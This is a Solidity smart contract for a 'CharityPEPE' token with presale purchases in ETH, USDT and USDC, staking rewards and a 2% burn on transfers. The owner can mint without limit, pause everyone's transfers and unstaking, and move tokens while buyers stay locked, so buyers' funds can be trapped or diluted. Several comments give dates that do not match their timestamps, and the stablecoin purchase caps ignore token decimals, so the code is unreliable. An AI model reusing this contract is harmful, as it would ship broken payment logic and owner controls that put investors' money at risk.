// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/**
 * @title CharityPEPE - A token contract with presale, staking, and burning features
 * @notice This contract allows presale purchases, staking with rewards, and burns 2% of each transfer
 */
contract CharityPEPE {
    string public name = "CharityPEPE";
    string public symbol = "CPEPE";
    uint256 public decimals = 18;
    uint256 public totalSupply;

    // Constants with documentation
    uint256 private constant BURN_FEE = 20000; // 2% burn fee in basis points (20000/1000000 = 2%)
    uint256 private constant BURN_DENOMINATOR = 1000000; // Denominator for burn fee calculation
    uint256 private constant TRANSFER_LOCK_TIME = 1764950400; // Transfers locked for non-owners until January 1, 2026, 00:00 UTC
    uint256 private constant STAGE1_START = 1746643200; // Presale Stage 1 starts: March 7, 2025, 20:00 UTC
    uint256 private constant STAGE1_END = 1759180800;   // Presale Stage 1 ends: July 30, 2025, 20:00 UTC
    uint256 private constant STAGE2_START = 1759181100; // Presale Stage 2 starts: July 30, 2025, 20:05 UTC
    uint256 private constant STAGE2_END = 1765036800;   // Presale Stage 2 ends: January 1, 2026, 20:00 UTC
    uint256 private constant STAGE1_RATE = 50000;       // Stage 1 rate: 1 ETH = 50,000 CPEPE
    uint256 private constant STAGE2_RATE = 30000;       // Stage 2 rate: 1 ETH = 30,000 CPEPE
    address private constant USDT_ADDRESS = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // USDT Mainnet address
    uint256 private constant USDT_RATE = 1000;          // 1 USDT = 1,000 CPEPE
    address private constant USDC_ADDRESS = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC Mainnet address
    uint256 private constant USDC_RATE = 1000;          // 1 USDC = 1,000 CPEPE
    uint256 private constant MAX_PURCHASE = 100 ether;  // Maximum purchase per transaction in ETH
    uint256 private constant MAX_TOKENS_FOR_SALE = 5e11 * (10 ** 18); // 500 billion CPEPE available for presale
    uint256 private constant MIN_STAKE_PERIOD = 1 days; // Minimum staking period

    address private _owner;
    bool private _paused;
    bool private _locked;
    uint256 private _tokensSold;
    mapping(address => uint256) private _lastUnstakeBlock;
    mapping(address => uint256) private _balanceOf;
    mapping(address => mapping(address => uint256)) private _allowance;
    mapping(address => uint256) private _stakedBalance;
    mapping(address => uint256) private _stakeStartTime;
    mapping(address => uint256) private _stakePeriod;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed from, uint256 value);
    event Mint(address indexed to, uint256 value);
    event Paused(address account);
    event Unpaused(address account);
    event Staked(address indexed user, uint256 amount, uint256 period);
    event Unstaked(address indexed user, uint256 amount, uint256 reward);
    event Airdrop(address indexed from, uint256 totalAmount);
    event TokensPurchased(address indexed buyer, uint256 amount, string currency);
    event ETHWithdrawn(address indexed owner, uint256 amount);
    event USDTWithdrawn(address indexed owner, uint256 amount);
    event USDCWithdrawn(address indexed owner, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == _owner);
        _;
    }

    modifier whenNotPaused() {
        require(!_paused);
        _;
    }

    modifier nonReentrant() {
        require(!_locked);
        _locked = true;
        _;
        _locked = false;
    }

    constructor() payable {
        _owner = msg.sender;
        totalSupply = 1e12 * (10 ** decimals); // 1 trillion tokens
        _balanceOf[address(this)] = totalSupply; // Tokens are assigned to the contract
    }

    function buyWithETH() public payable whenNotPaused nonReentrant {
        require(block.timestamp >= STAGE1_START && block.timestamp <= STAGE2_END);
        require(msg.value <= MAX_PURCHASE);
        uint256 rate = (block.timestamp <= STAGE1_END) ? STAGE1_RATE : STAGE2_RATE;
        uint256 tokenAmount = msg.value * rate;
        require(_balanceOf[address(this)] >= tokenAmount);
        require(_tokensSold + tokenAmount <= MAX_TOKENS_FOR_SALE);
        
        _balanceOf[address(this)] -= tokenAmount;
        _balanceOf[msg.sender] += tokenAmount;
        _tokensSold += tokenAmount;
        emit TokensPurchased(msg.sender, tokenAmount, "ETH");
    }

    function buyWithUSDT(uint256 usdtAmount) public whenNotPaused nonReentrant {
        require(block.timestamp >= STAGE1_START && block.timestamp <= STAGE2_END);
        require(usdtAmount <= MAX_PURCHASE / USDT_RATE);
        uint256 tokenAmount = usdtAmount * USDT_RATE;
        require(_balanceOf[address(this)] >= tokenAmount);
        require(_tokensSold + tokenAmount <= MAX_TOKENS_FOR_SALE);
        
        uint256 balanceBefore = IERC20(USDT_ADDRESS).balanceOf(_owner);
        require(IERC20(USDT_ADDRESS).transferFrom(msg.sender, _owner, usdtAmount));
        uint256 balanceAfter = IERC20(USDT_ADDRESS).balanceOf(_owner);
        require(balanceAfter >= balanceBefore + usdtAmount);

        _balanceOf[address(this)] -= tokenAmount;
        _balanceOf[msg.sender] += tokenAmount;
        _tokensSold += tokenAmount;
        emit TokensPurchased(msg.sender, tokenAmount, "USDT");
    }

    function buyWithUSDC(uint256 usdcAmount) public whenNotPaused nonReentrant {
        require(block.timestamp >= STAGE1_START && block.timestamp <= STAGE2_END);
        require(usdcAmount <= MAX_PURCHASE / USDC_RATE);
        uint256 tokenAmount = usdcAmount * USDC_RATE;
        require(_balanceOf[address(this)] >= tokenAmount);
        require(_tokensSold + tokenAmount <= MAX_TOKENS_FOR_SALE);
        
        uint256 balanceBefore = IERC20(USDC_ADDRESS).balanceOf(_owner);
        require(IERC20(USDC_ADDRESS).transferFrom(msg.sender, _owner, usdcAmount));
        uint256 balanceAfter = IERC20(USDC_ADDRESS).balanceOf(_owner);
        require(balanceAfter >= balanceBefore + usdcAmount);

        _balanceOf[address(this)] -= tokenAmount;
        _balanceOf[msg.sender] += tokenAmount;
        _tokensSold += tokenAmount;
        emit TokensPurchased(msg.sender, tokenAmount, "USDC");
    }

    function withdrawETH() public onlyOwner nonReentrant {
        uint256 balance = address(this).balance;
        require(balance > 0);
        (bool sent, ) = payable(_owner).call{value: balance}("");
        require(sent);
        emit ETHWithdrawn(_owner, balance);
    }

    function withdrawUSDT() public onlyOwner nonReentrant {
        uint256 balance = IERC20(USDT_ADDRESS).balanceOf(address(this));
        require(balance > 0);
        uint256 ownerBalanceBefore = IERC20(USDT_ADDRESS).balanceOf(_owner);
        require(IERC20(USDT_ADDRESS).transfer(_owner, balance));
        uint256 ownerBalanceAfter = IERC20(USDT_ADDRESS).balanceOf(_owner);
        require(ownerBalanceAfter >= ownerBalanceBefore + balance);
        emit USDTWithdrawn(_owner, balance);
    }

    function withdrawUSDC() public onlyOwner nonReentrant {
        uint256 balance = IERC20(USDC_ADDRESS).balanceOf(address(this));
        require(balance > 0);
        uint256 ownerBalanceBefore = IERC20(USDC_ADDRESS).balanceOf(_owner);
        require(IERC20(USDC_ADDRESS).transfer(_owner, balance));
        uint256 ownerBalanceAfter = IERC20(USDC_ADDRESS).balanceOf(_owner);
        require(ownerBalanceAfter >= ownerBalanceBefore + balance);
        emit USDCWithdrawn(_owner, balance);
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function paused() external view returns (bool) {
        return _paused;
    }

    function tokensSold() external view returns (uint256) {
        return _tokensSold;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balanceOf[account];
    }

    function allowance(address account, address spender) external view returns (uint256) {
        return _allowance[account][spender];
    }

    function mint(address to, uint256 value) public onlyOwner nonReentrant returns (bool) {
        require(to != address(0));
        totalSupply += value;
        _balanceOf[to] += value;
        emit Mint(to, value);
        return true;
    }

    function pause() public onlyOwner {
        require(!_paused);
        _paused = true;
        emit Paused(msg.sender);
    }

    function unpause() public onlyOwner {
        require(_paused);
        _paused = false;
        emit Unpaused(msg.sender);
    }

    function emergencyWithdraw(address account) public onlyOwner nonReentrant {
        require(_paused);
        require(account != address(0));
        uint256 stakedAmount = _stakedBalance[account];
        if (stakedAmount > 0) {
            _stakedBalance[account] = 0;
            _balanceOf[account] += stakedAmount;
            emit Unstaked(account, stakedAmount, 0);
        }
    }

    function stake(uint256 amount, uint256 period) public whenNotPaused nonReentrant {
        require(period == 3 || period == 12);
        require(amount > 0);
        require(amount <= _balanceOf[msg.sender]);

        _balanceOf[msg.sender] -= amount;
        _stakedBalance[msg.sender] += amount;
        _stakeStartTime[msg.sender] = block.timestamp;
        _stakePeriod[msg.sender] = period;
        emit Staked(msg.sender, amount, period);
    }

    function unstake() public whenNotPaused nonReentrant {
        require(_stakedBalance[msg.sender] > 0);
        require(_lastUnstakeBlock[msg.sender] != block.number);
        address sender = msg.sender;
        uint256 stakeTime = block.timestamp - _stakeStartTime[sender];
        require(stakeTime >= MIN_STAKE_PERIOD);

        uint256 amount = _stakedBalance[sender];
        uint256 periodInSeconds = _stakePeriod[sender] * 30 days;
        require(stakeTime >= periodInSeconds);

        uint256 rewardRate = (_stakePeriod[sender] == 3) ? 6 : 12;
        uint256 reward = (amount * rewardRate * stakeTime) / (100 * 365 days);
        uint256 totalAmount = amount + reward;

        _stakedBalance[sender] = 0;
        _balanceOf[sender] += totalAmount;
        totalSupply += reward;
        _lastUnstakeBlock[sender] = block.number;
        emit Unstaked(sender, amount, reward);
    }

    function transfer(address to, uint256 amount) public whenNotPaused nonReentrant returns (bool) {
        require(to != address(0));
        require(amount > 0);
        address sender = msg.sender;
        require(_balanceOf[sender] >= amount);
        require(sender == _owner || block.timestamp > TRANSFER_LOCK_TIME); // Transfers restricted until January 1, 2026, 00:00 UTC for non-owners

        uint256 burnAmount = (amount * BURN_FEE) / BURN_DENOMINATOR;
        uint256 transferAmount = amount - burnAmount;

        _balanceOf[sender] -= amount;
        _balanceOf[to] += transferAmount;
        totalSupply -= burnAmount;
        emit Transfer(sender, to, transferAmount);
        emit Burn(sender, burnAmount);
        return true;
    }

    function approve(address spender, uint256 value) public whenNotPaused returns (bool) {
        require(spender != address(0));
        require(value <= totalSupply);
        _allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public whenNotPaused nonReentrant returns (bool) {
        require(from != address(0));
        require(to != address(0));
        require(value > 0);
        require(_balanceOf[from] >= value);
        require(_allowance[from][msg.sender] >= value);
        require(from == _owner || block.timestamp > TRANSFER_LOCK_TIME); // Transfers restricted until January 1, 2026, 00:00 UTC for non-owners

        uint256 burnAmount = (value * BURN_FEE) / BURN_DENOMINATOR;
        uint256 transferAmount = value - burnAmount;

        _balanceOf[from] -= value;
        _balanceOf[to] += transferAmount;
        totalSupply -= burnAmount;
        _allowance[from][msg.sender] -= value;
        emit Transfer(from, to, transferAmount);
        emit Burn(from, burnAmount);
        return true;
    }

    function airdrop(address[] memory recipients, uint256[] memory values) public onlyOwner nonReentrant {
        uint256 len = recipients.length;
        require(len == values.length);
        require(len > 0);
        require(len <= 100);

        address sender = msg.sender;
        uint256 totalAirdrop = 0;
        for (uint256 i; i < len; ++i) {
            totalAirdrop += values[i];
        }
        require(totalAirdrop <= _balanceOf[sender]);

        for (uint256 i; i < len; ++i) {
            address recipient = recipients[i];
            uint256 value = values[i];
            require(recipient != address(0));
            _balanceOf[sender] -= value;
            _balanceOf[recipient] += value;
            emit Transfer(sender, recipient, value);
        }
        emit Airdrop(sender, totalAirdrop);
    }
}

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}